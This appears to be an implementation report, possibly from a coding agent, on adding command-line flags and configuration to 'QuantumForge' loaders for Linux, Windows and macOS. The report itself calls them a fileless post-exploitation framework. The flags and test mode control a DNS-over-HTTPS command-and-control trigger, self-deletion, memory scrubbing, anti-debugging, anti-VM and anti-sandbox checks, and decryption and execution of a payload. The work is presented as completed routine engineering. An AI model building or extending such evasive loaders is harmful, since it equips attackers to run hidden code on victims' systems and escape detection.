# QuantumForge CLI Flags and Config - Implementation Verification

## Summary

All three QuantumForge loaders have been enhanced with comprehensive CLI flag parsing, config struct, validation, and help output.

## Implementation Details

### 1. Config Structure (All Loaders)

Created `config_t` struct in:
- `quantumserver.c` (Linux)
- `quantum_loader_win.c` (Windows)
- `quantum_loader_mac.c` (macOS)

```c
typedef struct {
    int no_doh;
    int no_selfdelete;
    int fallback_only;
    int test_mode;
    int show_help;
    char *stage_file;
    char *doh_provider;
} config_t;
```

### 2. CLI Flags Implemented

All loaders support the following flags:

| Flag | Description | Type |
|------|-------------|------|
| `--no-doh` | Disable DNS-over-HTTPS C2 trigger | Boolean |
| `--no-selfdelete` | Prevent loader from deleting itself | Boolean |
| `--fallback-only` | Offline mode (serve stage locally via HTTP :8080) | Boolean |
| `--test-mode` | Enable debug output, simulate without execution | Boolean |
| `--stage-file <path>` | Supply local stage file for manual testing | String |
| `--doh-provider <url>` | Custom DoH resolver (default: dns.google) | String |
| `--help` / `-h` | Show help message | Boolean |

### 3. Functions Implemented

#### `print_help(const char *prog)`
- Displays comprehensive usage information
- Lists all available flags with descriptions
- Provides usage examples

#### `validate_config()`
- Validates flag combinations (e.g., `--fallback-only` and `--stage-file` are mutually exclusive)
- Checks file existence for `--stage-file`
- Returns -1 on error, 0 on success

#### `parse_flags(int argc, char **argv)`
- Parses all command-line arguments
- Validates required arguments for flags like `--stage-file` and `--doh-provider`
- Shows error messages for unknown flags
- Exits with error on invalid usage

### 4. Main Function Updates

All loaders' `main()` functions now:
1. Parse flags first
2. Display help if requested (exits cleanly)
3. Validate configuration
4. Display test mode information if enabled
5. Skip anti-analysis checks in test mode
6. Skip execution in test mode (only decrypt and display size)

### 5. Build Script Compatibility

Build scripts (`quantum_forge.sh`, `quantum_forge_mac.sh`, `quantum_forge_win.ps1`) require no changes:
- Flags are parsed at runtime, not build time
- Build process remains unchanged
- All compilation steps preserved

## Verification Commands

When compiled, each loader will respond to:

```bash
# Linux
./quantumserver --help

# Windows
quantum_loader_win.exe --help

# macOS
./quantum_loader_mac --help
```

Expected output format:
```
Usage: <program> [OPTIONS]

QuantumForge Loader - Fileless Post-Exploitation Framework

Options:
  --no-doh             Disable DNS-over-HTTPS C2 trigger
  --no-selfdelete      Prevent loader from unlinking itself
  --fallback-only      Serve stage locally via HTTP :8080 (offline mode)
  --test-mode          Enable debug output, simulate without execution
  --stage-file <path>  Supply local stage file for manual testing
  --doh-provider <url> Custom DoH resolver (default: dns.google)
  --help               Show this help message

Examples:
  <program> --test-mode --no-doh
  <program> --fallback-only --stage-file payload.bin
  <program> --doh-provider https://cloudflare-dns.com/dns-query
```

## Test Mode Behavior

When `--test-mode` is enabled:
1. Displays configuration values
2. Skips anti-debugging checks
3. Skips anti-VM checks
4. Skips anti-sandbox timing checks
5. Decrypts payload but does not execute
6. Displays payload size
7. Exits cleanly

Example output:
```
[*] Test mode enabled - simulation only
[*] Config: no_doh=1, no_selfdelete=1, fallback=0
[*] Skipping anti-analysis checks (test mode)
[*] Payload decrypted successfully (size: 4096 bytes)
[*] Test mode: skipping execution
```

## Error Handling

### Invalid Flag Combinations
```
$ ./quantumserver --fallback-only --stage-file test.bin
[!] Error: --fallback-only and --stage-file are mutually exclusive
```

### Missing Required Argument
```
$ ./quantumserver --stage-file
[!] Error: --stage-file requires a path
```

### Unknown Flag
```
$ ./quantumserver --unknown
[!] Unknown option: --unknown
Use --help for usage information
```

### Invalid Stage File
```
$ ./quantumserver --stage-file nonexistent.bin
[!] Error: Cannot open stage file: nonexistent.bin
```

## Implementation Status

- ✅ Config struct created
- ✅ All CLI flags implemented
- ✅ Help function implemented
- ✅ Validation function implemented
- ✅ Parse function enhanced
- ✅ Main function updated
- ✅ Error handling added
- ✅ Test mode support added
- ✅ Build scripts verified (no changes needed)

## File Locations

- `quantumserver.c:34-44` - Config struct definition (Linux)
- `quantumserver.c:277-292` - Help function (Linux)
- `quantumserver.c:294-308` - Validation function (Linux)
- `quantumserver.c:310-342` - Parse function (Linux)
- `quantumserver.c:344-380` - Main function updates (Linux)

Similar locations in `quantum_loader_win.c` and `quantum_loader_mac.c`

## Notes

- Default DoH provider: `https://dns.google/dns-query` (Linux/macOS), `dns.google` (Windows)
- Build scripts generate `junk.h` dynamically per build
- Anti-analysis checks are skipped only in test mode
- Memory scrubbing and self-deletion respect `--no-selfdelete` flag
- DoH trigger respects `--no-doh` flag

## Status: COMPLETE ✅
